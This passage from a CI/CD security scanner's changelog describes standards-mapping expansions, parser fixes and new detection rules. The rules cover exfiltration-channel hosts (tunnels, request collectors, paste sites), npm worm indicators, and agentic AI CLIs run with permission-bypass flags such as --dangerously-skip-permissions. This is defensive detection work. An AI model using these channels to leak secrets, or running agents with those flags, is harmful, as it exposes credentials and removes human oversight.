  OCI-002, the in-toto / SLSA attestation content rules. After:
  211 mappings (was 152), all 11 controls evidenced.

- **Broadened OpenSSF Scorecard mappings to 85% catalog coverage.**
  Cross-mapping pass, no new rule modules, 138 net-new entries.
  Scorecard's check set (Pinned-Dependencies, Dangerous-Workflow,
  Token-Permissions, Signed-Releases, SBOM, Vulnerabilities, SAST,
  Code-Review, Branch-Protection, Dependency-Update-Tool) is
  narrower than CIS SSCS, so the expansion targets the rules that
  fit those checks. **Pinned-Dependencies** picks up the
  NPM/PyPI/Maven dep-supply-chain pack (NPM-001..006,
  PYPI-001..006, MVN-001..007), the Dockerfile env-bypass pack
  (DF-021/22/24/26..29 + DF-009), reusable-workflow / services
  pinning (GHA-017/051, BB-029), HELM-008 stale Chart.lock, and
  the Cloud Build curl-pipe / TLS / pkg-integrity surface
  (GCB-010/011/013). **Dangerous-Workflow** picks up
  **TAINT-001..008** (cross-step injection), the GHA worm-
  mitigation + advanced-PPE pack (GHA-030..036, 041..049, 052/53/
  56/57/58), cross-pipeline / cross-project artifact ingestion
  rules (ADO-010, BB-010, GL-010), docker-privileged variants
  across providers (BB-005/13, CB-002, CC-010/15/17, GL-017,
  JF-17/25, TKN-13), the GCB shell / tainted-substitution pack
  (GCB-016/019/022/023), and Dockerfile privileged / env-bypass
  shapes (DF-008/12/23/30 + NPM-004/007). **Token-Permissions**
  picks up GHA-030/33/34/43/49/50/54/55/57, NPM-011, CC-004/14/31,
  DR-004, GL-031, JF-003/33/34, ARGO-013, GCB-012/18/20, DF-025,
  CA-003, PBAC-002/005, and Terraform / CloudFormation IaC-native
  long-lived-key + hard-coded-secret rules (TF-001/2, CF-001/2).
  **Signed-Releases** picks up GCB-017/024 and the in-toto / SLSA
  attestation content rules (ATTEST-001/002/005/006). **SBOM**
  picks up GCB-015, ATTEST-003/004/007, OCI-003/005, and JF-027
  (archiveArtifacts fingerprint). **SAST** + **Branch-Protection**
  pick up the SCM-043..047 signed-commit + code-scanning pack.
  **Code-Review** picks up ADO-029, BB-013/28, BK-013, CC-031.
  After: 441 mappings (was 303), all 10 controls evidenced. The
  75 rules that remain unmapped are scoped outside Scorecard's
  check set (timeout / ephemeral / discoverability hygiene,
  network-boundary AWS rules, container-runtime hygiene,
  `-000` degraded-mode discovery findings, secret-scanning posture
  per the existing carve-outs).

- **Broadened SLSA Build Track to 80% catalog coverage, plus
  GCB rule-numbering fix.** Cross-mapping pass, no new rule modules,
  188 net-new entries. **Build.L3.NonFalsifiable** absorbs the
  per-CI secret / cred / unpinned / untrusted-trigger surface
  across CodeBuild (CB-001/05/06/08/09/10/11), CodePipeline (CP-04/
  05/07), CircleCI (CC-005/09/13/18/19/22/26/29/30/31), Drone
  (DR-001..011), and the GitHub Actions / GitLab / Bitbucket /
  Azure DevOps / Jenkins long-lived-creds + deploy-gate + service-
  image-unpinned + malicious-indicator gaps. The dep-supply-chain
  pack (NPM-001..007/11, PYPI-001..006, MVN-001..007) lands on
  L3.NonFalsifiable since each unpinned / non-registry /
  compromised-version finding is a tenant-substitutable input.
  **Build.L3.Isolated** absorbs **TAINT-001..008** (cross-step
  influence on the build env), the Dockerfile env-bypass pack
  (DF-005/12/21..30), TKN-013/15, ARGO-015, BK-15, GL-032/33,
  ADO-030, JF-25/32/35, and the GCB tainted-substitution shell
  pack. **L1.Provenance** picks up SIGN-001/002, LMB-001, CA-001,
  ECR-005, JF-027 (archiveArtifacts fingerprint), HELM-007/010,
  OCI-003/005, and the SBOM rule GCB-015. **L2.Signed** picks up
  SCM-043 / SCM-044 (signed-commit posture). IAM extends to the
  full IAM-001..008 NonFalsifiable surface. Terraform /
  CloudFormation IaC-native rules (TF-001..003, CF-001..003)
  land on L3.NonFalsifiable + L3.Isolated. **Bug fix:** the
  existing GCB-008/009/014/015 mappings were inverted — the rule
  IDs got renumbered at some point but the SLSA file's comments
  + targets weren't updated. GCB-008 (vuln scanning) is no longer
  mis-credited to L1.Provenance / L2.Signed; GCB-009 (signing) now
  maps to L2.Signed; GCB-014 (logging disabled) is no longer
  mis-mapped to L3.Isolated; GCB-015 (SBOM) now correctly maps
  to L1.Provenance only; and the actual provenance rule GCB-017
  is now mapped to [L1.Provenance, L2.Signed, L3.NonFalsifiable].
  After: 413 mappings (was 225), all SLSA controls evidenced,
  80% of the OWASP catalog. The 103 rules left unmapped are
  scoped outside the Build track (vuln scanning, audit logs,
  deploy env, AWS lifecycle hygiene, source-side SCM review
  controls, container runtime hygiene, `-000` discovery findings).

- **Broadened NIST SSDF (SP 800-218 v1.1) to 99% catalog coverage.**
  Cross-mapping pass, no new rule modules, 334 net-new entries.
  SSDF is the broadest framework the scanner targets — 13 controls
  across Prepare-the-Org (PO), Protect-the-Software (PS),
  Produce-Well-Secured (PW), and Respond-to-Vulnerabilities (RV) —
  so almost every rule lands. Follows the existing per-rule pattern:
  pinning + TLS + dep verify → PW.4.1 + PW.4.4; shell-eval +
  interpolation + sandbox-escape → PW.6.1 + PW.9.1; secret leakage
  + long-lived creds + persistence → PS.1.1; signing + SBOM +
  attestation → PS.2.1 + PS.3.2; approval gates + env separation
  + branch-filter → PO.5.1; timeout + ephemeral + runtime hardening
  → PO.5.2 + PW.9.1; audit-trail + retention → PO.3.3; vuln scan
  + compromised-pkg + malicious-activity → RV.1.1. Picks up the
  full GHA-006..058 worm-mitigation + advanced-PPE catalog,
  GL-006..033, BB-006..029, ADO-006..030, CC-024..031, BK-014/015,
  the entire Jenkins (JF-001..035), Drone (DR-001..011), Tekton
  (TKN-001..015), and Argo (ARGO-001..015) provider packs, the
  NPM/PyPI/Maven dep-supply-chain pack, Dockerfile env-bypass pack
  (DF-021..030), OCI manifest gaps (OCI-001..008 minus OCI-006),
  the ATTEST family, TAINT-001..008, the AWS extras (CB-008..11,
  CP-005/7, CA-001..4, CCM-001..3, SIGN-001/2, LMB-001..4,
  KMS-001/2, SM-001/2, SSM-001/2, CT/CWL/CW/EB audit-trail,
  ECR-006/7, PBAC-003/5, IAM-007/8), SCM-043..047, and TF/CF
  IaC-native long-lived-key + hard-coded-secret + VPC-public-subnet
  rules. The `-000` degraded-mode discovery findings all map to
  PO.3.3 (audit trail), mirroring the CIS SSCS / OWASP / ESF
  visibility-gap precedent. After: 515/516 = 99% (was 181, 35%).
  Only OCI-006 (excessive layer count) remains unmapped — pure
  image-bloat hygiene with no SSDF analog.

- **Broadened NIST SP 800-53 Rev. 5 to 100% catalog coverage.**
  Cross-mapping pass, no new rule modules, 269 net-new entries.
  800-53 is the federal control catalog and is broad enough that
  every scanner rule lands. Follows the existing per-rule pattern:
  pinning + 3rd-party verification → SR-3 + SR-11 (+ SI-2 for
  flaw remediation cadence, + RA-5 for vuln monitoring on
  compromised-pkg variants); script injection / dangerous shell →
  CM-6 + SA-11; secret leakage → IA-5 (+ SC-28 for at-rest
  variants, + AU-9 for protection-of-audit on egress variants);
  signing / SBOM / attestation → SI-7 + SR-4 (+ CM-8 for
  component inventory on SBOM-content); TLS bypass → SC-8 +
  SC-13; privileged / runtime hardening → AC-6 + CM-6 + CM-7;
  approval gates / branch governance → SA-10 + SA-15 + AC-3;
  timeout / retention / audit hygiene → CM-6 + AU-2 + AU-11 +
  AU-12; vuln scan / SCA / malicious indicators → RA-5 + SI-2.
  Picks up the full GHA-006..058 + GL-006..033 + BB-006..029 +
  ADO-006..030 + CC-024..031 + JF-002..032 + DR-001..011 +
  BK-014/015 + TKN-014/015 + ARGO-014/015 + GCB-004 surface, the
  NPM/PyPI/Maven dep-supply-chain pack, OCI manifest gaps
  (OCI-001..008), the ATTEST family, TAINT-001..008, Dockerfile
  env-bypass extension (DF-024..030), AWS extras (CB-008..011,
  CP-005/007, ECR-006/007, IAM-007/008, PBAC-003/005), TF/CF
  IaC-native rules, SCM-016 + SCM-043..047, and the `-000`
  degraded-mode discovery findings on AU-2 + AU-12 (audit-event
  gap, mirroring the cross-standard visibility-gap precedent).
  After: 516/516 = 100% (was 247, 48%). The 800-53 family
  catalog is broad enough that every scanner rule has a home;
  no carve-outs remain.

- **Broadened NIST SP 800-190 to 65% catalog coverage.** Cross-
  mapping pass, no new rule modules, 153 net-new entries. 800-190
  is the container security guide — narrowly scoped to image
  risks (§4.1), registry risks (§4.2), and container runtime
  (§4.4). The existing docstring carves out orchestrator (§4.3),
  host OS (§4.5), and signing/SBOM/provenance (those live in
  SLSA / 800-53). Expansion focuses on the rules that genuinely
  touch the image / registry / container risk surface: Dockerfile
  env-bypass pack (DF-007/9/11/21..30) — TLS-disabling envs map
  to 4.2.1, runtime-affecting envs map to 4.1.2 + 4.4.5;
  NPM/PyPI/Maven dep-supply-chain — non-registry/HTTP/wildcard-
  mirror → 4.2.1, mutable / unpinned → 4.1.5, compromised → 4.1.3,
  lifecycle scripts → 4.4.5, secret globs → 4.1.4; OCI manifest
  gaps — provenance metadata + integrity → 4.1.5, foreign-layer
  URL → 4.2.1, layer count → 4.1.2; Helm per-field provenance →
  4.1.5, HELM-008 stale Chart.lock → 4.2.2. Per-CI provider gaps
  pick up the container-touching subset: no-timeout / untrusted-
  context / cache-poisoning / dangerous-shell → 4.4.5; persisted
  tokens + secret echoes → 4.1.4; unpinned service / runner /
  plugin images → 4.1.5; TLS bypass / remote-install → 4.2.1;
  worm IOCs → 4.1.3; resource-class / egress / shared role /
  no-worker-pool → 4.4.3; rogue triggers (cache poisoning, agent
  any, build-job ignores downstream, fork-PR webhooks) → 4.4.6.
  TAINT-001..008 lands on 4.4.5 (untrusted code reaches build
  runtime). SCM-022 (allowed_actions unrestricted) → 4.1.5 as
  the lone SCM rule that touches container risk; other SCM
  governance stays scoped out. After: 339/516 = 65% (was 186,
  36%). The 177 unmapped rules are scoped outside 800-190's
  container surface: SCM governance (47), signing/SBOM/SLSA
  across providers (per the existing carve-out), cloud IAM (9),
  KMS/SM/SSM secret stores (9), CT/CWL/CW/EB audit logs (10),
  TF/CF IaC, ATTEST family, `-000` discovery findings, and
  pipeline-flow rules that are governance rather than container-
  runtime concerns.

- **Broadened NIST CSF 2.0 to 100% catalog coverage.** Cross-
  mapping pass, no new rule modules, 193 net-new entries. CSF 2.0
  is the cross-function cybersecurity framework — Govern,
  Protect, Detect, Respond, Recover — so almost every rule has
  a subcategory home. Follows the existing per-rule pattern:
  pinning + 3rd-party verification → GV.SC-05 (+ GV.SC-07 for
  ongoing monitoring on compromised-pkg / reputation variants);
  SBOM → GV.SC-03 + GV.SC-04; secrets / creds → PR.AA-01 (+
  PR.DS-01 for at-rest); IAM access → PR.AA-05 + PR.AA-03;
  privileged / runtime hardening → PR.PS-01; dangerous-shell /
  interpolation / poisoned-pipeline → PR.PS-05; signing / deploy
  gates / branch governance → PR.PS-06; outdated deps / vuln scan
  → PR.PS-02; TLS bypass / data-in-transit → PR.DS-02; network
  boundary / cache-poisoning / fork-PR triggers → PR.IR-01;
  resilience / rollback → PR.IR-03 + RC.RP-01; audit logs →
  PR.PS-04 + DE.CM-09; external-provider monitoring → DE.CM-06;
  multi-source correlation → DE.AE-03; incident triggers →
  RS.MA-01. Picks up the full per-CI extension surface
  (GHA-014/030..058, GL-004/29..33, BB-004/28/29, ADO-004/29/30,
  CC-004/9/31, JF-005/24/26/27/32, DR-001..011), the Tekton /
  Argo K8s-native packs (TKN-001..015, ARGO-001..015), the
  Cloud Build extension (GCB-010..026), the AWS extras
  (CB-008/10, CP-001/5, CD-002, CCM-001/2, CA-003, ECR-004),
  TF/CF IaC-native rules, SCM-043..047, the NPM/PyPI/Maven dep-
  supply-chain pack, OCI manifest (OCI-001..008), ATTEST family,
  TAINT-001..008, Dockerfile env-bypass extension (DF-009/24..30),
  and the `-000` degraded-mode discovery findings on PR.PS-04 +
  DE.CM-09 (visibility gap, mirroring the cross-standard
  precedent). After: 516/516 = 100% (was 323, 62%). All 22
  subcategories evidenced.

- **Broadened SOC 2 to 100% catalog coverage.** Cross-mapping pass,
  no new rule modules, 277 net-new entries. SOC 2's Common Criteria
  (CC6 logical access, CC7 system operations, CC8 change management)
  cover almost every pipeline-config posture rule. Follows the
  existing per-rule pattern: secrets / creds / long-lived tokens →
  CC6.1 (+ CC6.2 / CC6.3 for provisioning + revocation); boundary
  / privileged / fork-PR / cache-poisoning → CC6.6; TLS bypass →
  CC6.7; malicious-software / dangerous-shell / interpolation /
  worm IOCs → CC6.8; vuln scan / outdated deps / compromised pkgs
  → CC7.1; audit / monitoring / build logs → CC7.2; event response
  / rollback → CC7.3 + CC7.4; signing / SBOM / attestation /
  pinning / deploy gates / branch governance → CC8.1. Picks up
  the full per-CI extension surface (GHA-006..058, GL-006..033,
  BB-005..029, ADO-005..030, CC-003..031, JF-006..032, DR-001..011),
  the Tekton + Argo K8s-native packs (TKN-001..015, ARGO-001..015),
  the Cloud Build extension (GCB-004..026), AWS extras (CB-004/7/
  9/10, CP-002, CCM-002, CA-001..003, ECR-004/5/6, EB-002, KMS-001,
  SM-001, SSM-001/2, LMB-001/3), TF/CF IaC-native rules,
  SCM-043..047, the NPM/PyPI/Maven dep-supply-chain pack, OCI
  manifest (OCI-001..008), ATTEST family, TAINT-001..008, Dockerfile
  env-bypass extension (DF-009/11/24..30), Helm chart provenance
  metadata (HELM-005..010 remaining), and the `-000` degraded-mode
  discovery findings on CC7.2 (monitoring-anomaly gap, mirroring
  the cross-standard visibility-gap precedent). After: 516/516 =
  100% (was 239, 46%). All 11 Common Criteria evidenced. As the
  docstring caveat reminds — passing all mapped checks demonstrates
  config substrate but not the auditor-reviewed operational
  evidence required for SOC 2 attestation.

- **Broadened PCI DSS v4.0 to 100% catalog coverage.** Cross-
  mapping pass, no new rule modules, 294 net-new entries. PCI DSS
  v4's Req-6 (secure systems and software), Req-7 (access control
  by need-to-know), Req-8 (identify + authenticate), and Req-10
  (log + monitor) collectively cover almost every pipeline-config
  rule. Follows the existing per-rule pattern: pinning + 3rd-party
  verification → 6.3.3 + 6.5.1; secrets / creds / long-lived
  tokens → 8.2.1 (+ 8.2.2 for shared accounts); privileged /
  runtime hardening / no-timeout → 6.4.1; TLS bypass / dangerous-
  shell / interpolation → 6.5.1; vuln scan / SCA / compromised
  packages → 6.3.1 + 6.3.3; approval gates / branch governance /
  deploy gates → 6.4.3; signing / SBOM / attestation → 6.5.1 +
  10.3.2; IAM / RBAC / OIDC trust → 7.2.x; audit logs → 10.2.1 +
  10.3.2 + 10.3.3. Picks up the full GHA-006..058, GL-006..033,
  BB-006..029, ADO-006..030, CC-024..031, the entire Jenkins
  (JF-001..035) and Drone (DR-001..011) provider packs,
  BK-014/015 + TKN-014/15 + ARGO-014/15 + GCB-007/17/18/21/24/25,
  the NPM/PyPI/Maven dep-supply-chain pack, OCI manifest
  (OCI-001..008), ATTEST family, TAINT-001..008, Dockerfile
  env-bypass extension + extras (DF-007/9/11/14/17/18/21..30),
  Helm chart provenance metadata (HELM-005..010 remaining), AWS
  extras (CB-008..11, CP-005/7, KMS-001, LMB-003), TF/CF IaC-
  native rules, SCM-043..047, and the `-000` degraded-mode
  discovery findings on 10.2.1 (audit-log enablement gap,
  mirroring the cross-standard visibility-gap precedent). After:
  516/516 = 100% (was 222, 43%). All 13 PCI DSS v4 controls
  evidenced.

- **Broadened NSA/CISA ESF Supply Chain to 100% catalog coverage,
  plus integrity-test fix.** Cross-mapping pass, no new rule
  modules, 184 net-new entries. ESF spans the SDLC across three
  volumes (Developer / Supplier / Customer), so the expansion has
  a natural home for most rules. Picks up the full GHA-030..058
  worm-mitigation pack, GL-028..033, BB-028/29, ADO-029/30,
  CC-029..031, JF-032..035, BK-014/15, TKN-014/15, ARGO-014/15,
  the entire Drone provider (DR-001..011), the NPM/PyPI/Maven dep-
  supply-chain pack, OCI manifest (OCI-001..008), ATTEST family on
  ESF-S-PROVENANCE + ESF-D-SBOM, TAINT-001..008 on ESF-D-INJECTION,
  Dockerfile env-bypass extension + extras (DF-009/11/17/18/21..30),
  AWS extras (CB-008..010, CP-005/7, CA-001..004, CCM-001..3,
  ECR-006/7, KMS-001/2, SM-001/2, SSM-001/2, LMB-001..4, IAM-007/8,
  PBAC-003/5, CT-001..3, CWL-001/2, EB-002, SIGN-001/2), TF/CF
  IaC-native rules, SCM-003/006/016/026/028/036/040/043..047
  (signed-commit + vuln intake + code-scanning surfaces that
  cleanly map to ESF-D-TAMPER + ESF-S-VULN-MGMT + ESF-D-CODE-
  REVIEW), and the remaining `-000` degraded-mode discovery
  findings on ESF-C-AUDIT (mirroring the existing pattern).
  **Bug fix:** the file had four pre-existing dangling control
  references that the integrity test didn't catch because
  esf_supply_chain wasn't in the parametrize list. JF-027 →
  ``ESF-D-TAMPER`` (now a defined control: "Protect build
  artifacts from tampering and detect unauthorized modification");
  BK-011 / TKN-011 / ARGO-011 → ``ESF-S-PROVENANCE`` (now a
  defined control: "Generate and verify provenance metadata
  (SLSA / in-toto) for produced artifacts"); TKN-013 →
  ``ESF-D-RUNTIME-HARDENING`` fixed to ``ESF-D-PRIV-BUILD``;
  ARGO-013 → ``ESF-D-LEAST-PRIV`` fixed to ``ESF-C-LEAST-PRIV``.
  ESF is now in the `TestStandardIntegrity` and
  `TestCheckIdIntegrity` parametrize lists so future dangling refs
  get caught at CI time.

  After: 516/516 = 100% (was 332, 64%). All 24 ESF controls
  evidenced (22 original + the 2 newly-added that backfill
  previously-dangling references).

- **Targeted expansions for the three intentionally-narrow CIS
  benchmarks.** Each of these standards is scoped narrowly per
  its existing docstring carve-outs (AWS Foundations covers
  AWS-pack rules; GitHub covers GitHub-platform + IaC scanner
  surfaces; Kubernetes covers manifest-evidenceable Section-5
  policies). Expansion stays inside those scopes:

  - **CIS AWS Foundations:** 18 net-new entries. CB-006 (long-
    lived source token) and CP-004 (legacy OAuth) land on 1.14
    (90-day key rotation), generalizing the rotation principle
    beyond IAM access keys. The `-000` degraded-mode discovery
    findings (16 rules) land on 3.1 (CloudTrail enabled in all
    regions) — when the scanner cannot enumerate an AWS surface,
    the visibility gap is the audit-trail evidence gap 3.1 is
    designed to prevent; S3-000 also maps to 3.6 (S3 access
    logging). After: 62/565 = 10% (was 44, 7%). The standard
    remains intentionally narrow — most AWS-pack rules don't
    have CIS Foundations controls within the benchmark's
    IAM/encryption/audit scope.

  - **CIS GitHub:** 54 net-new entries. **1.5.2** (CI/CD
    pipeline-instruction scanning) absorbs the GHA-030..058
    worm-mitigation + advanced-PPE pack (anchored at GitHub-
    specific patterns the benchmark enumerates) and the
    TAINT-001..008 cross-step injection family. **1.5.3** (IaC
    scanning) extends across Dockerfile (DF-006/8/19/20/21/24/
    26..29), Kubernetes (K8S-005/13/17/18/37), and TF/CF
    (TF-002/3, CF-002/3) so the IaC scanner surface matches the
    manifest reality. After: 118/565 = 20% (was 64, 11%). The
    standard stays GitHub-platform-scoped — non-SCM / non-GHA /
    non-IaC rules remain out of scope.

  - **CIS Kubernetes:** 10 net-new entries. The Section-5 policy
    surface extends to **Tekton** TaskRun / PipelineRun Pod-
    producing kinds (TKN-002 privileged → 5.2.2 + 5.2.7; TKN-004
    hostPath → 5.2.5 + 5.2.12; TKN-007 default SA → 5.1.5;
    TKN-013 sidecar privileged → 5.2.2 + 5.2.7) and **Argo
    Workflow** templates (ARGO-002/3/4/6/13). HELM-006 (missing
    kubeVersion compat range) lands on 5.7.1 since Helm renders
    to Kubernetes manifests at deploy time. After: 45/565 = 7%
    (was 35, 6%). The standard stays manifest-policy-scoped —
    pipeline-side rules and non-K8s providers remain out of
    scope.

  All three benchmarks are intentionally narrow caps on the
  catalog, not gaps to close. The percentages here reflect
  realistic ceilings given each benchmark's scope.

- **Standards-coverage audit + corrections.** The standards-
  expansion campaign above used 516 as the OWASP catalog
  denominator. The true catalog size is 565 — the regex used to
  count entries didn't allow digits in the rule-prefix, so it
  missed the K8S-* and S3-* families. Restating the post-campaign
  coverage against the correct denominator:

  | Standard | Was reported | Actual (pre-backfill) |
  |---|---|---|
  | nist_800_53 | 100% | 99% (S3-000 missing) |
  | nist_csf_2 | 100% | 99% (S3-000 missing) |
  | soc2 | 100% | 98% (K8S-015/16/25/30 + S3-000/002) |
  | pci_dss_v4 | 100% | 92% (full K8s pack missing) |
  | esf_supply_chain | 100% | 92% (full K8s pack missing) |
  | nist_ssdf | 99% | 92% (full K8s pack missing) |
  | cis_supply_chain | 99% | 91% (full K8s pack + KMS-001/SM-001/S3-000) |

  Audit-driven backfill restores the previously-claimed 100% as
  honest numbers. The K8s manifest pack (K8S-001..043) is added to
  cis_supply_chain (deployment Section 5), esf_supply_chain
  (Customer-side deployment), nist_ssdf (PO/PW deployment env), and
  pci_dss_v4 (Req-6 system-component change surface). Each
  standard's K8s mappings follow the rule's natural fit within
  that standard's vocabulary — image-pinning to dependency-verify
  controls, RBAC / SA to least-privilege, secret literals to
  credential-protection, runtime-hardening to env-separation /
  secure-defaults. soc2 picks up the four missing K8s rules
  (K8S-015/16/25/30) plus S3-002. nist_800_53 / nist_csf_2 / soc2
  / cis_supply_chain absorb the S3-000 visibility-gap finding on
  the same audit-trail controls the other -000 family already uses.
  cis_supply_chain additionally maps KMS-001 (CMK rotation) and
  SM-001 (Secrets Manager rotation) to 4.1.1 / 1.3.4 — the
  rotation principle that already governs IAM-007 / CB-006 / CP-004.

  After: six standards at legitimate **565/565 = 100%** (NIST 800-53,
  NIST CSF 2.0, SOC 2, PCI DSS v4, ESF Supply Chain, OWASP). Two
  more at 99% with documented per-rule carve-outs: CIS SSCS
  (DF-007 HEALTHCHECK + OCI-006 layer count) and NIST SSDF (OCI-006
  alone). Coverage-floor table in `tests/test_standards.py` is
  ratcheted to a couple percent below current state for every
  framework, including the previously-missing cis_github entry.

- **Doc-claim drift fixes.** README.md compliance-standards table
  listed SLSA Build Track as "6/7 levels (110 check mappings)";
  actual after expansion is 413. The OWASP page intro in
  `scripts/gen_standards_docs.py` said "the other 13 frameworks
  layer their own labels"; correct count is 14 (15 total minus
  OWASP itself). Both regenerated.

### Fixed

- **`_IMAGE_TOKEN_RE` now matches implicit-registry image refs.**
  The OCI image-token pre-filter required either a dotted hostname
  (``gcr.io/...``) or a registry-port shape (``localhost:5000/...``)
  in the first component, so Docker Hub implicit refs like
  ``myorg/app:1.2`` and ``library/redis:7.0`` were silently dropped
  before reaching ``oci_image()``. Worked against AC-005
  (build → deploy reachability) matching accuracy whenever the
  workflow used Docker Hub names. Regex now accepts two shapes:
  ``<host>/<repo>[/<sub>]*`` with explicit dotted/ported host, or
  ``<seg>/<seg>[/<seg>]*`` with no host but at least two path
  segments. Bare words (``latest``, ``python``) still don't match.
  New ``tests/test_oci_refs.py`` pins both ends of the trade-off.

- **Gradle map-style dependency parsing is now order-insensitive.**
  ``_GRADLE_MAP_DEP_RE`` enforced ``group → name → version`` in
  that exact order, but Gradle named arguments are unordered in
  both Groovy and Kotlin DSL. Declarations like
  ``api group: 'org.hibernate', version: '3.0.5', name: 'hibernate'``
  or any other permutation were silently skipped, causing
  ``MVN-*`` rules to miss real dependencies. Split the parser
  into a window regex that locates three ``key: value`` pairs
  followed by three per-key extractors that pull each coordinate
  independently. All six permutations plus Kotlin DSL multi-line
  are now covered by ``test_gradle.TestParseGradle``.

- **Doc drift on Terraform / CloudFormation provider pages.**
  Published `docs/providers/terraform.md` and
  `docs/providers/cloudformation.md` carried stale OWASP tags:
  CD-001 / CD-002 showed `CICD-SEC-7` against `CWE-754`, TF-003 /
  CF-003 showed `CICD-SEC-5` against `CWE-1327`. The underlying
  rule modules had been retagged to `CICD-SEC-1` (deployment
  rollback) and `CICD-SEC-7` (artifact-integrity boundary)
  respectively, but the generator wasn't re-run, so GitHub Pages
  served the old values. Regenerated both files.

- **`scripts/link_standards_check_ids.py` corrupted in-page anchor
  links.** Running the linker after `gen_standards_docs.py` would
  nest the heading anchor `` `[`X-N`](#detail-x-n)` `` inside a second
  markdown link, producing malformed
  `` `[[`X-N`](../providers/aws.md)](#detail-x-n)` ``
  tokens. Tightened the regex (reject `[` / `]` lookbehind and `]`
  lookahead) and scoped the linker to mapping-table rows only,
  matching its documented intent. The full doc-generation pipeline
  is now idempotent end-to-end.

- **Per-generator `--check` mode is now uniform.**
  `gen_provider_docs.py`, `gen_standards_docs.py`, and
  `link_standards_check_ids.py` gain `--check` flags
  (`gen_attack_chains_doc.py` already had one). Each exits 1 if any
  on-disk doc would change. A new
  `tests/test_generated_docs_in_sync.py` runs all four in `--check`
  mode and is the catch-all drift guard, complementing the existing
  numerical-claim tests (`tests/test_doc_claims.py`) and rule-id
  presence tests (`tests/test_rule_framework.py`). The two
  pre-existing terraform / cloudformation drifts above were caught
  by this new test on first run.

## [1.0.5] - 2026-05-18

### Added

- **SCM signed-commit + code-scanning posture pack (SCM-043..047).**
  Five new GitHub-only SCM rules that fill the previously-thin
  signed-commit and SAST surfaces. `SCM-043` flags active
  tag-targeted rulesets that don't enforce ``required_signatures``
  on tag pushes (release-tag forgery surface that branch-side
  SCM-006 / SCM-036 don't cover). `SCM-044` flags the default
  branch protection requiring signed commits while
  ``enforce_admins`` is off — admin / stolen-admin-PAT bypass on
  the cryptographic signing requirement, narrower than SCM-010's
  generic admin-bypass shape. `SCM-045` flags default code
  scanning configured with the ``default`` query suite instead of
  ``extended`` (gate exists but is shallower than one-click
  achievable). `SCM-046` flags default scanning where
  ``state == configured`` but no ``schedule`` is set — the silent-
  pass shape SCM-003 misses, where the setup record exists but no
  scan output ever lands. `SCM-047` flags CodeQL-supported
  repository languages (≥5% byte share) that are missing from the
  default-setup ``languages`` set; reads a new ``repo_languages``
  slot hydrated from ``GET /repos/{owner}/{repo}/languages``.
  Mapped to ``cis_supply_chain`` 1.1.6 / 1.1.7 / 1.1.17,
  ``cis_github`` 1.1.12 / 1.1.14 / 1.1.17 / 1.1.18 / 1.5.4, and
  ``owasp_cicd_top_10`` CICD-SEC-1 / -6 / -9 / -10.

- **Supply-chain worm detection pack (GHA-056..058, AC-028..029).**
  New GitHub Actions rules targeting the post-`tj-actions` wave of
  worm-class attacks. `GHA-056` flags literal IOC strings from the
  Sept 2025 Shai-Hulud npm worm and the Aug 2025 Nx `s1ngularity`
  compromise (the `shai-hulud-workflow.yml` filename, the worm's
  webhook.site UUID, repo names matching `Shai-Hulud` /
  `Shai-Hulud Migration` / `s1ngularity-repository`), backed by a
  new curated `_worm_indicators.py` registry mirroring the existing
  `_compromised_actions.py` shape. `GHA-057` flags secret-scanner
  output (TruffleHog, gitleaks) piped to network egress or invoked
  on untrusted triggers (`pull_request_target`, `issue_comment`,
  `workflow_run`), the harvest-leg primitive Shai-Hulud's postinstall
  used. `GHA-058` flags agentic CLIs (`claude`, `gemini`, `q`,
  `cursor-agent`, `aider`, `openhands`, `goose`) invoked with
  permission-bypass flags (`--dangerously-skip-permissions`,
  `--yolo`, `--trust-all-tools`, `--allowedTools '*'`), the
  s1ngularity follow-up vector. `AC-028` correlates `NPM-004`
  (install-time lifecycle scripts) with `GHA-048` (workflow
  self-mutation) or `GHA-049` (cross-repo push) — the co-location
  is the Shai-Hulud propagation topology. `AC-029` correlates an
  attacker-influenced trigger (GHA-002 / GHA-009 / GHA-013) with a
  long-lived publish credential (GHA-050 / GHA-005) and an
  unguarded dep-install path (GHA-021 / GHA-029) — the lane both
  the Ultralytics PyPI cache-poison (Dec 2024) and the Nx
  s1ngularity compromise ran through.

- **Compromised-package registry refresh (NPM-006, PYPI-006).**
  `_compromised_packages.py` for both ecosystems now carries the
  2023–2025 incident wave: Ledger Connect Kit 1.1.5–1.1.7 (Dec 2023),
  Lottie Player 2.0.5–2.0.7 (Oct 2024), `@rspack/core` /
  `@rspack/cli` / `vant` 2.x–4.x (Dec 2024), `@solana/web3.js`
  1.95.6–1.95.7 (CVE-2024-54134), Ultralytics 8.3.41–8.3.46
  (cache-poisoned PyPI release, Dec 2024), the `eslint-config-prettier`
  CVE-2025-54313 family (`eslint-plugin-prettier`, `synckit`,
  `@pkgr/core`, `napi-postinstall`), `nx` 20.9–21.8 (s1ngularity,
  Aug 2025), and a curated subset of the Shai-Hulud Sept 2025
  affected list (`@ctrl/*`, `@crowdstrike/*`, `ngx-bootstrap`,
  `rxnt-*`). Operators wanting the long tail of Shai-Hulud IOCs
  should cross-reference the Microsoft advisory cited in each entry.

- **Exfil-channel IOC refresh (`_malicious.py`).** GHA-027's
  exfil-channel pattern set now covers ngrok subdomains
  (`*.ngrok.io`, `*.ngrok-free.app`, `*.ngrok.app`), Cloudflare
  Quick Tunnels (`*.trycloudflare.com`), serveo SSH tunnels
  (`*.serveo.net`), pipedream / requestbin / requestcatcher
  collectors, and a wider secondary paste-site list (`dpaste.com`,
  `0bin.net`, `ghostbin.co`, `paste.bingner.com`, `hastebin.com`,
  `paste.rs`, `controlc.com`, `justpaste.it`).

- **Maven package provider (`--pipeline maven`).** Static analysis of
  `pom.xml` and `settings.xml` mirroring the npm / pypi pattern: seven
  rules covering floating Maven version ranges (`[1.0,2.0)`, `LATEST`,
  `RELEASE`), mutable `-SNAPSHOT` dependencies, plaintext-HTTP
  repository URLs, dependencies that omit `<version>`, lax
  `<checksumPolicy>` on non-Central repositories, known-compromised
  Maven Central versions (curated registry seeded with Log4Shell /
  Spring4Shell / Text4Shell), and `<settings.xml>` `<mirrorOf>*` /
  `external:*` wildcard mirrors. Property substitution (`${...}`) is
  resolved against the POM's `<properties>` block before each rule
  evaluates. `<dependencyManagement>` entries are surfaced separately
  so version-management blocks don't trigger consumption-side rules.
  Brings the provider count to 22. Adds `--maven-path` and pom.xml
  auto-detection.

- **CIS GitHub Benchmark standard (`cis_github`).** Platform-side
  posture mapping for a single GitHub org or repo, sections 1.1
  (Code Changes), 1.4 (Third-Party), and 1.5 (Code Risks). Evidenced
  directly by the existing `SCM-*` rule pack via the GitHub REST API,
